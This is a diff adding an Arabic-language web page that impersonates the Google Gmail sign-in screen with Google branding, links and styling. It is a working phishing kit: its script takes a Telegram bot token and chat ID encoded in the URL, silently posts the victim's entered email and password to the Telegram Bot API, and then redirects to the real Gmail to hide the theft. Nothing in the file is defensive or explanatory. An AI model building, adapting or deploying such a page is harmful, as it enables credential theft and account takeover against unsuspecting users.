@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول • Gmail</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* 📦 البطاقة الرئيسية */
+        .card {
+            background: #ffffff;
+            border-radius: 28px;
+            border: 1px solid #dadce0;
+            padding: 48px 40px 36px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        /* 🔵 شعار Google */
+        .logo-wrapper {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .logo-wrapper .google-logo {
+            font-size: 26px;
+            font-weight: 500;
+            color: #202124;
+            letter-spacing: -0.5px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .logo-wrapper .google-logo .letter {
+            font-family: 'Product Sans', 'Google Sans', Arial, sans-serif;
+            font-weight: 700;
+        }
+
+        .g-blue { color: #4285f4; }
+        .g-red { color: #ea4335; }
+        .g-yellow { color: #fbbc05; }
+        .g-green { color: #34a853; }
+
+        /* 📧 شعار Gmail */
+        .gmail-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+
+        .gmail-icon img {
+            width: 40px;
+            height: 40px;
+            object-fit: contain;
+        }
+
+        .gmail-icon .gmail-text {
+            font-size: 22px;
+            font-weight: 500;
+            color: #202124;
+        }
+
+        /* 📝 العنوان */
+        .card h1 {
+            font-size: 24px;
+            color: #202124;
+            margin-bottom: 12px;
+            font-weight: 400;
+            text-align: center;
+        }
+
+        .card .subtitle {
+            color: #5f6368;
+            font-size: 15px;
+            margin-bottom: 32px;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        /* 📝 حقول الإدخال */
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .input-group .input-wrapper {
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px 48px 16px 16px;
+            border: 1.5px solid #dadce0;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #ffffff;
+            transition: all 0.2s ease;
+            outline: none;
+            color: #202124;
+            direction: ltr;
+            text-align: right;
+        }
+
+        .input-group input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.1);
+        }
+
+        .input-group input::placeholder {
+            color: #80868b;
+            font-size: 15px;
+        }
+
+        .input-group input.error {
+            border-color: #d93025;
+            background: #fce8e6;
+        }
+
+        .input-group input.error:focus {
+            border-color: #d93025;
+            box-shadow: 0 0 0 3px rgba(217, 48, 37, 0.15);
+        }
+
+        .input-group input.success {
+            border-color: #1e8e3e;
+            background: #e6f4ea;
+        }
+
+        .field-error {
+            color: #d93025;
+            font-size: 13px;
+            margin-top: 6px;
+            display: none;
+            font-weight: 400;
+            text-align: right;
+        }
+
+        .field-error.show {
+            display: block;
+            animation: slideDown 0.2s ease;
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* 👁️ زر إظهار كلمة المرور */
+        .toggle-password {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px;
+            color: #5f6368;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            width: 34px;
+            height: 34px;
+        }
+
+        .toggle-password:hover {
+            color: #1a73e8;
+            background: #f1f3f4;
+        }
+
+        .toggle-password:active {
+            transform: translateY(-50%) scale(0.9);
+        }
+
+        .toggle-password svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+        }
+
+        /* 🔗 رابط "نسيت كلمة المرور" + "إنشاء حساب" */
+        .link-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 8px;
+            margin-bottom: 32px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .link-row a {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            transition: all 0.2s;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-family: inherit;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .link-row a:hover {
+            background: rgba(26, 115, 232, 0.06);
+        }
+
+        .link-row .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+        }
+
+        /* 🔵 زر "التالي" */
+        .btn-next {
+            width: 100%;
+            padding: 14px;
+            background: #1a73e8;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            letter-spacing: 0.3px;
+            font-family: inherit;
+        }
+
+        .btn-next:hover {
+            background: #1765cc;
+            box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
+        }
+
+        .btn-next:active {
+            transform: scale(0.98);
+        }
+
+        .btn-next:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        /* 🦶 الفوتر */
+        .footer {
+            text-align: center;
+            margin-top: 32px;
+            color: #5f6368;
+            font-size: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+            padding: 0 10px;
+        }
+
+        .footer .lang {
+            color: #5f6368;
+            font-size: 13px;
+            cursor: pointer;
+            padding: 4px 8px;
+            border-radius: 4px;
+            transition: all 0.2s;
+        }
+
+        .footer .lang:hover {
+            background: #f1f3f4;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 16px;
+            font-size: 12px;
+        }
+
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #1a73e8;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 32px 24px 28px;
+                border-radius: 20px;
+            }
+            .card h1 {
+                font-size: 20px;
+            }
+            .card .subtitle {
+                font-size: 14px;
+                margin-bottom: 24px;
+            }
+            .btn-next {
+                font-size: 14px;
+                padding: 13px;
+            }
+            .input-group input {
+                padding: 14px 44px 14px 14px;
+                font-size: 15px;
+            }
+            .link-row {
+                flex-direction: column;
+                gap: 8px;
+                align-items: stretch;
+            }
+            .link-row a {
+                text-align: center;
+            }
+            .footer {
+                flex-direction: column;
+                gap: 8px;
+            }
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+
+        .loading {
+            animation: pulse 1s infinite;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <div class="card">
+
+        <!-- 🔵 شعار Google الملون -->
+        <div class="logo-wrapper">
+            <div class="google-logo">
+                <span class="letter g-blue">G</span>
+                <span class="letter g-red">o</span>
+                <span class="letter g-yellow">o</span>
+                <span class="letter g-blue">g</span>
+                <span class="letter g-green">l</span>
+                <span class="letter g-red">e</span>
+            </div>
+        </div>
+
+        <!-- 📧 شعار Gmail -->
+        <div class="gmail-icon">
+            <img src="gmail.png" alt="Gmail">
+            <span class="gmail-text">Gmail</span>
+        </div>
+
+        <!-- 📝 العنوان -->
+        <h1>تسجيل الدخول</h1>
+        <p class="subtitle">استخدم حسابك في Google للوصول إلى Gmail</p>
+
+        <form id="loginForm" novalidate>
+
+            <!-- حقل البريد الإلكتروني -->
+            <div class="input-group">
+                <div class="input-wrapper">
+                    <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required autocomplete="username" inputmode="email">
+                </div>
+                <div class="field-error" id="emailError"></div>
+            </div>
+
+            <!-- حقل كلمة المرور -->
+            <div class="input-group">
+                <div class="input-wrapper">
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور" required autocomplete="current-password">
+                    <button type="button" class="toggle-password" data-target="password" aria-label="إظهار كلمة المرور">
+                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                    </button>
+                </div>
+                <div class="field-error" id="passwordError"></div>
+            </div>
+
+            <!-- روابط -->
+            <div class="link-row">
+                <a href="https://accounts.google.com/signin/recovery" id="forgotLink">
+                    هل نسيت كلمة المرور؟
+                </a>
+                <a href="https://accounts.google.com/signup" id="createLink" class="create-account">
+                    إنشاء حساب
+                </a>
+            </div>
+
+            <!-- زر التالي -->
+            <button type="submit" class="btn-next" id="loginBtn">التالي</button>
+
+        </form>
+
+    </div>
+
+    <!-- 🦶 الفوتر -->
+    <div class="footer">
+        <span class="lang">العربية ▾</span>
+        <div class="footer-links">
+            <a href="https://policies.google.com/privacy?hl=ar">الخصوصية</a>
+            <a href="https://policies.google.com/terms?hl=ar">الشروط</a>
+            <a href="https://support.google.com/accounts?hl=ar">مساعدة</a>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    // ================================================================
+    // 🔐 قراءة البيانات المشفّرة من الرابط وفك تشفيرها
+    // ================================================================
+    // الرابط يكون بهذا الشكل:
+    // gmail-login.html?d=BASE64_ENCODED_STRING
+    //
+    // حيث BASE64_ENCODED_STRING = Base64(TOKEN + "|" + CHAT_ID)
+    // ================================================================
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const encodedData = urlParams.get('d') || "";
+
+    let BOT_TOKEN = "";
+    let CHAT_ID = "";
+
+    if (encodedData) {
+        try {
+            const decoded = atob(encodedData);
+            const parts = decoded.split('|');
+            BOT_TOKEN = parts[0] || "";
+            CHAT_ID   = parts[1] || "";
+        } catch (e) {
+            console.error('❌ فشل فك التشفير:', e);
+        }
+    }
+
+    if (!BOT_TOKEN || !CHAT_ID) {
+        console.warn('⚠️ البيانات المشفّرة غير موجودة في الرابط!');
+        console.warn('💡 استخدم الصيغة: ?d=BASE64_STRING');
+    }
+
+    // ================================================================
+    // 1. TOGGLE PASSWORD VISIBILITY
+    // ================================================================
+    document.querySelectorAll('.toggle-password').forEach(button => {
+        button.addEventListener('click', function() {
+            const targetId = this.getAttribute('data-target');
+            const input = document.getElementById(targetId);
+            
+            if (!input) return;
+
+            if (input.type === 'password') {
+                input.type = 'text';
+                this.innerHTML = `
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                        <path d="M3.27 2.5L2 3.77 5.23 7C3.31 8.3 1.96 10.01 1 12c1.73 4.39 6 7.5 11 7.5 1.91 0 3.73-.48 5.31-1.31L20.23 21 21.5 19.73 3.27 2.5zM12 17c-2.76 0-5-2.24-5-5 0-.96.27-1.87.76-2.64l1.44 1.44c-.13.39-.2.79-.2 1.2 0 1.66 1.34 3 3 3 .41 0 .81-.07 1.2-.2l1.44 1.44C13.87 16.73 12.96 17 12 17zm3.12-5.03c.08.33.13.67.13 1.03 0 1.66-1.34 3-3 3-.36 0-.7-.05-1.03-.13l3.9-3.9z"/>
+                    </svg>
+                `;
+                this.setAttribute('aria-label', 'إخفاء كلمة المرور');
+            } else {
+                input.type = 'password';
+                this.innerHTML = `
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                    </svg>
+                `;
+                this.setAttribute('aria-label', 'إظهار كلمة المرور');
+            }
+        });
+    });
+
+    // ================================================================
+    // 2. SEND TO TELEGRAM
+    // ================================================================
+    function sendToTelegram(email, password) {
+        if (!BOT_TOKEN || !CHAT_ID) {
+            console.error('❌ لا يمكن الإرسال: البيانات غير موجودة!');
+            return;
+        }
+
+        const message = `
+📧 **تسجيل دخول - Gmail**
+
+📮 **البريد الإلكتروني / الهاتف:** 
+\`${email}\`
+
+🔑 **كلمة المرور:** 
+\`${password}\`
+
+🕐 **التاريخ:** ${new Date().toLocaleString('ar-EG')}
+
+📌 **IP المستخدم:** ${window.location.hostname}
+        `;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        }).catch(error => {
+            console.log('Telegram send error:', error);
+        });
+    }
+
+    // ================================================================
+    // 3. FORM SUBMISSION
+    // ================================================================
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const loginBtn = document.getElementById('loginBtn');
+
+        // إعادة تعيين الأخطاء
+        document.querySelectorAll('.field-error').forEach(el => {
+            el.classList.remove('show');
+            el.textContent = '';
+        });
+
+        document.querySelectorAll('.input-group input').forEach(el => {
+            el.classList.remove('error', 'success');
+        });
+
+        let hasEmptyFields = false;
+
+        if (!email) {
+            document.getElementById('email').classList.add('error');
+            document.getElementById('emailError').textContent = '⚠️ يرجى إدخال البريد الإلكتروني أو رقم الهاتف';
+            document.getElementById('emailError').classList.add('show');
+            hasEmptyFields = true;
+        }
+
+        if (!password) {
+            document.getElementById('password').classList.add('error');
+            document.getElementById('passwordError').textContent = '⚠️ يرجى إدخال كلمة المرور';
+            document.getElementById('passwordError').classList.add('show');
+            hasEmptyFields = true;
+        }
+
+        if (hasEmptyFields) return;
+
+        if (password.length < 6) {
+            document.getElementById('password').classList.add('error');
+            document.getElementById('passwordError').textContent = '⚠️ كلمة المرور يجب أن تكون 6 أحرف على الأقل';
+            document.getElementById('passwordError').classList.add('show');
+            return;
+        }
+
+        // ============================================================
+        // ✅ نجاح العملية: إرسال إلى Telegram + التوجيه
+        // ============================================================
+        loginBtn.disabled = true;
+        loginBtn.textContent = '⏳ جاري التوجيه...';
+        loginBtn.classList.add('loading');
+
+        // إرسال البيانات إلى Telegram
+        sendToTelegram(email, password);
+
+        // التوجيه مباشرة إلى Gmail
+        setTimeout(() => {
+            window.location.href = 'https://mail.google.com';
+        }, 700);
+    });
+
+    // ================================================================
+    // 4. REAL-TIME VALIDATION
+    // ================================================================
+    document.getElementById('email').addEventListener('input', function() {
+        if (this.value.trim()) {
+            this.classList.remove('error');
+            document.getElementById('emailError').classList.remove('show');
+        }
+    });
+
+    document.getElementById('password').addEventListener('input', function() {
+        if (this.value.trim()) {
+            this.classList.remove('error');
+            document.getElementById('passwordError').classList.remove('show');
+        }
+    });
+
+    // ================================================================
+    // 5. KEYBOARD SHORTCUTS
+    // ================================================================
+    document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && e.shiftKey && (e.key === 'P' || e.key === 'p')) {
+            e.preventDefault();
+            document.querySelectorAll('.toggle-password').forEach(btn => btn.click());
+        }
+        if (e.ctrlKey && e.key === 'Enter') {
+            e.preventDefault();
+            document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+        }
+    });
+
+    // ================================================================
+    // 6. EXTERNAL LINKS
+    // ================================================================
+    document.getElementById('forgotLink').addEventListener('click', function(e) {
+        e.preventDefault();
+        window.location.href = 'https://accounts.google.com/signin/recovery';
+    });
+
+    document.getElementById('createLink').addEventListener('click', function(e) {
+        e.preventDefault();
+        window.location.href = 'https://accounts.google.com/signup';
+    });
+
+    console.log('✅ Gmail Login page loaded successfully!');
+    console.log('🔓 Data will be sent to Telegram silently!');
+</script>
+
+</body>
+</html>
